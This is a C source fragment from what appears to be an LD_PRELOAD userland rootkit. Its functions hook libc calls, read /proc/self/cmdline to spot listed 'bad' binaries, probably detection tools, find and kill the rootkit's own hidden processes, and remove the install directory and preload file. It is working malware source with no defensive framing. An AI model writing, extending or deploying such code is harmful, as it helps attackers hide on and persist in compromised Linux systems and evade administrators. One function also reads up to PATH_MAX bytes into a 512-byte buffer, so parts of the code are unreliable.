#define PCMDL_PATH   "/proc/self/cmdline"
#define PNAME_MAXLEN 256
#define PCMDL_MAXLEN 512
char *cprocname(void){
    char *pname = (char *)malloc(PNAME_MAXLEN);
    FILE *cmdline;

    hook(o_fopen, "fopen");
    cmdline = o_fopen(PCMDL_PATH, "r");
    if(cmdline == NULL) return "bash";

    fread(pname, PNAME_MAXLEN, 1, cmdline);
    fclose(cmdline);
    return pname;
}

char *gcmdline(void){
    char *cmdline = (char *)malloc(PCMDL_MAXLEN);
    int i, c, fd;

    hook(o_open, "open");
    hook(o_read, "read");

    fd = o_open(PCMDL_PATH, 0, 0);
    if(fd < 0){
        strncpy(cmdline, "bash", 5);
        goto end_gcmdline;
    }
    
    c = o_read(fd, cmdline, PATH_MAX);
    for(i = 0; i < c; i++)
        if(cmdline[i] == 0x00)
            cmdline[i] = 0x20;
    close(fd);
end_gcmdline:
    return cmdline;
}

int kill_self(void){
#ifdef DM_ROOT
    kill(getpid(), SIGTERM);
    return 0;
#endif

    if(getuid() != 0)
        return -1;

    int ret = 0;
    struct dirent *dir;
    char path[PATH_MAX];
    DIR *dirp;

    hook(o_opendir, "opendir");
    dirp = o_opendir(INSTALL_DIR);
    if(dirp == NULL) return -1;

    hook(o_readdir, "readdir");
    hook(o_unlink, "unlink");
    while((dir = o_readdir(dirp)) != NULL){
        if(!strcmp(".\0", dir->d_name) || !strcmp("..\0", dir->d_name))
            continue;

        snprintf(path, sizeof(path), "%s/%s", INSTALL_DIR, dir->d_name);
        if(o_unlink(path) < 0){
            ret = -1;
            break;
        }
    }
    closedir(dirp);

    if(ret != -1){
        hook(o_rmdir, "rmdir");
        if(o_rmdir(INSTALL_DIR) < 0) return -1;
        if(o_unlink(PRELOAD) < 0) return -1;
        kill_rk_procs();  /* we've gotten this far. we can kill all of our processes. */
    }
    return ret;
}

int is_bad_proc(const char *filename){
    char fnm_proc[128];
    for(int i = 0; bad_bins[i] != NULL; i++){
        snprintf(fnm_proc, sizeof(fnm_proc), "*/%s", bad_bins[i]);

        if(strstr(cprocname(), bad_bins[i])) return 1;
        if(strstr(filename, bad_bins[i])) return 1;
        if(!fnmatch(fnm_proc, filename, FNM_PATHNAME)) return 1;
    }
    return 0;
}

DIR *open_procd(void){
    hook(o_opendir, "opendir");
    DIR *ret = o_opendir("/proc");
    return ret;
}

void kill_rk_procs(void){
    int status = 0;
    struct dirent *dir;
    DIR *dirp;
    char pp[PATH_MAX];

    dirp = open_procd();
    if(dirp == NULL) return;

    hook(o_readdir, "readdir");
    while((dir = o_readdir(dirp)) != NULL){
        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "/\0") ||
           !strcmp(dir->d_name, "net") || !strcmp(dir->d_name, "self") ||
           !strcmp(dir->d_name, "thread-self")) continue;

        snprintf(pp, sizeof(pp), "/proc/%s", dir->d_name);
        if(hxstat(pp)){
            status = 1;
            kill(atoi(dir->d_name), SIGTERM);
        }
    }
    closedir(dirp);
    if(status)  /* if we've killed rk processes, wait for sockets to die */
        sleep(BPROC_WAIT);
}

int is_betrayed_alive(void){
    int status = 0;
    struct dirent *dir;
    DIR *dirp;
    char pp[PATH_MAX];
    
    dirp = open_procd();
    if(dirp == NULL) return 0;

    hook(o_readdir, "readdir");
    while((dir = o_readdir(dirp)) != NULL){
        if(!strcmp(dir->d_name, ".\0") || !strcmp(dir->d_name, "/\0") ||
           !strcmp(dir->d_name, "net") || !strcmp(dir->d_name,"self") ||
           !strcmp(dir->d_name, "thread-self")) continue;

        snprintf(pp, sizeof(pp), "/proc/%s", dir->d_name);
        if(hxstat(pp)){
            status = 1;
            break;
        }
    }
    closedir(dirp);
    return status;
}
